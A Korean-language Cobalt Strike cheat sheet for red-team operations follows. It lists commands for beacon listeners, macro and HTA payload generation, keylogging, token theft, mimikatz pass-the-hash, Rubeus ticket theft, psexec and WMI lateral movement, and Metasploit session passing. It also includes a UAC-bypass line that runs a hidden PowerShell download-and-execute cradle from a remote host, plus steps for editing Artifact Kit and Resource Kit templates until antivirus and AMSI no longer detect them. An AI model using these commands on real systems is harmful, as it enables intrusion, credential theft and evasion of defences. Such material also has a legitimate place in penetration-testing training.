# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` 그런 다음 수신 대기할 위치와 사용할 비콘 종류(http, dns, smb...) 등을 선택할 수 있습니다.

### Peer2Peer Listeners

이 리스너의 비콘은 C2와 직접 통신할 필요가 없으며, 다른 비콘을 통해 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit` 그런 다음 TCP 또는 SMB 비콘을 선택해야 합니다.

* **TCP 비콘은 선택한 포트에서 리스너를 설정합니다**. TCP 비콘에 연결하려면 다른 비콘에서 `connect <ip> <port>` 명령을 사용하십시오.
* **smb 비콘은 선택한 이름의 파이프 이름에서 수신 대기합니다**. SMB 비콘에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** HTA 파일용
* **`MS Office Macro`** 매크로가 포함된 오피스 문서용
* **`Windows Executable`** .exe, .dll 또는 서비스 .exe용
* **`Windows Executable (S)`** **스테이지리스** .exe, .dll 또는 서비스 .exe용 (스테이지리스가 스테이지보다 좋음, IoCs가 적음)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 이는 비콘을 cobalt strike에서 다운로드하기 위한 스크립트/실행 파일을 생성합니다. 형식에는 bitsadmin, exe, powershell 및 python이 포함됩니다.

#### Host Payloads

호스팅할 파일이 이미 웹 서버에 있는 경우 `Attacks -> Web Drive-by -> Host File`로 이동하여 호스팅할 파일과 웹 서버 구성을 선택하십시오.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly &#x3C;/path/to/executable.exe>

# Screenshots
printscreen    # PrintScr 방법을 통해 단일 스크린샷 찍기
screenshot     # 단일 스크린샷 찍기
screenwatch    # 데스크탑의 주기적인 스크린샷 찍기
## 보기 -> 스크린샷으로 이동하여 확인

# keylogger
keylogger [pid] [x86|x64]
## 보기 > 키스트로크에서 눌린 키 확인

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 다른 프로세스 내에서 포트 스캔 작업 주입
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Powershell 모듈 가져오기
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;여기에 powershell cmd 작성>

# User impersonation
## 자격 증명으로 토큰 생성
make_token [DOMAIN\user] [password] # 네트워크에서 사용자를 가장하기 위한 토큰 생성
ls \\computer_name\c$ # 생성된 토큰을 사용하여 C$에 접근 시도
rev2self # make_token으로 생성된 토큰 사용 중지
## make_token 사용 시 이벤트 4624가 생성됩니다: 계정이 성공적으로 로그인되었습니다. 이 이벤트는 Windows 도메인에서 매우 일반적이지만 로그온 유형으로 필터링하여 좁힐 수 있습니다. 위에서 언급했듯이, 이는 LOGON32_LOGON_NEW_CREDENTIALS를 사용하며, 이는 유형 9입니다.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## pid에서 토큰 훔치기
## make_token과 유사하지만 프로세스에서 토큰을 훔칩니다
steal_token [pid] # 또한, 이는 네트워크 작업에 유용하며, 로컬 작업에는 유용하지 않습니다.
## API 문서에서 이 로그온 유형은 "호출자가 현재 토큰을 복제할 수 있도록 허용합니다"라고 알려줍니다. 그래서 비콘 출력에서 Impersonated &#x3C;current_username>라고 표시되는 것입니다 - 이는 우리의 복제된 토큰을 가장하고 있습니다.
ls \\computer_name\c$ # 생성된 토큰을 사용하여 C$에 접근 시도
rev2self # steal_token에서 토큰 사용 중지

## 새로운 자격 증명으로 프로세스 시작
spawnas [domain\username] [password] [listener] # 읽기 권한이 있는 디렉토리에서 수행: cd C:\
## make_token과 마찬가지로, 이는 Windows 이벤트 4624를 생성합니다: 계정이 성공적으로 로그인되었습니다. 그러나 로그온 유형은 2(LOGON32_LOGON_INTERACTIVE)입니다. 호출 사용자(TargetUserName)와 가장된 사용자(TargetOutboundUserName)가 상세히 설명됩니다.

## 프로세스에 주입
inject [pid] [x64|x86] [listener]
## OpSec 관점에서: 정말 필요하지 않는 한 크로스 플랫폼 주입을 수행하지 마십시오 (예: x86 -> x64 또는 x64 -> x86).

## 해시 전달
## 이 수정 프로세스는 LSASS 메모리 패칭을 요구하며, 이는 고위험 작업으로 로컬 관리자 권한이 필요하고 Protected Process Light (PPL)가 활성화된 경우에는 실행 가능성이 낮습니다.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## mimikatz를 통한 해시 전달
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## /run 없이, mimikatz는 cmd.exe를 생성합니다. 데스크탑으로 실행 중인 사용자라면 셸을 볼 수 있습니다 (SYSTEM으로 실행 중이라면 문제 없습니다).
steal_token &#x3C;pid> # mimikatz에 의해 생성된 프로세스에서 토큰 훔치기

## 티켓 전달
## 티켓 요청
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## 새로운 티켓을 사용하기 위해 새로운 로그온 세션 생성 (손상된 세션을 덮어쓰지 않기 위해)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## 공격자 머신에서 파워셸 세션을 통해 티켓을 작성하고 로드합니다
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## SYSTEM에서 티켓 전달
## 티켓으로 새로운 프로세스 생성
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## 해당 프로세스에서 토큰 훔치기
steal_token &#x3C;pid>

## 티켓 추출 + 티켓 전달
### 티켓 목록
execute-assembly C:\path\Rubeus.exe triage
### luid로 흥미로운 티켓 덤프
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### 새로운 로그온 세션 생성, luid 및 processid 기록
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### 생성된 로그온 세션에 티켓 삽입
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### 마지막으로, 해당 새로운 프로세스에서 토큰 훔치기
steal_token &#x3C;pid>

# Lateral Movement
## 토큰이 생성되면 사용됩니다
jump [method] [target] [listener]
## 방법:
## psexec                    x86   서비스 EXE 아티팩트를 실행하기 위해 서비스 사용
## psexec64                  x64   서비스 EXE 아티팩트를 실행하기 위해 서비스 사용
## psexec_psh                x86   서비스에서 PowerShell 원라이너 실행
## winrm                     x86   WinRM을 통해 PowerShell 스크립트 실행
## winrm64                   x64   WinRM을 통해 PowerShell 스크립트 실행

remote-exec [method] [target] [command]
## 방법:
<strong>## psexec                          서비스 제어 관리자 통해 원격 실행
</strong>## winrm                           WinRM을 통해 원격 실행 (PowerShell)
## wmi                             WMI를 통해 원격 실행

## wmi로 비콘을 실행하려면 (jump 명령에 포함되지 않음) 비콘을 업로드하고 실행하십시오
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## 메타플로잇 호스트에서
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## cobalt에서: Listeners > Add 및 Payload를 Foreign HTTP로 설정합니다. Host를 10.10.5.120으로, Port를 8080으로 설정하고 저장을 클릭합니다.
beacon> spawn metasploit
## 외부 리스너로 x86 Meterpreter 세션만 생성할 수 있습니다.

# Pass session to Metasploit - Through shellcode injection
## 메타플로잇 호스트에서
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenom을 실행하고 multi/handler 리스너를 준비합니다.

## bin 파일을 cobalt strike 호스트로 복사합니다
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64 프로세스에 메타스플로잇 셸코드 주입

# Pass metasploit session to cobalt strike
## 스테이지리스 비콘 셸코드를 생성합니다. Attacks > Packages > Windows Executable (S)로 이동하여 원하는 리스너를 선택하고 출력 유형으로 Raw를 선택한 후 x64 페이로드를 사용합니다.
## 메타스플로잇에서 post/windows/manage/shellcode_inject를 사용하여 생성된 cobalt strike 셸코드를 주입합니다.


# Pivoting
## 팀 서버에서 소켓 프록시 열기
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

일반적으로 `/opt/cobaltstrike/artifact-kit`에서 cobalt strike가 이진 비콘을 생성하는 데 사용할 코드와 미리 컴파일된 템플릿( `/src-common`에 있음)을 찾을 수 있습니다.

생성된 백도어(또는 컴파일된 템플릿)와 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 Defender가 트리거되는 원인을 찾을 수 있습니다. 일반적으로 문자열입니다. 따라서 최종 이진 파일에 해당 문자열이 나타나지 않도록 백도어를 생성하는 코드를 수정할 수 있습니다.

코드를 수정한 후 동일한 디렉토리에서 `./build.sh`를 실행하고 `dist-pipe/` 폴더를 Windows 클라이언트의 `C:\Tools\cobaltstrike\ArtifactKit`로 복사하십시오.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
`dist-pipe\artifact.cna`의 공격적인 스크립트를 로드하는 것을 잊지 마세요. 이는 Cobalt Strike가 우리가 원하는 디스크의 리소스를 사용하도록 지시합니다.

### Resource Kit

ResourceKit 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 스크립트 기반 페이로드 템플릿이 포함되어 있습니다.

[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)와 함께 템플릿을 사용하면 방어자가 (이 경우 AMSI) 좋아하지 않는 것을 찾아 수정할 수 있습니다.
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 라인을 수정하면 잡히지 않는 템플릿을 생성할 수 있습니다.

Cobalt Strike가 우리가 원하는 리소스를 디스크에서 사용하도록 하려면 공격적인 스크립트 `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

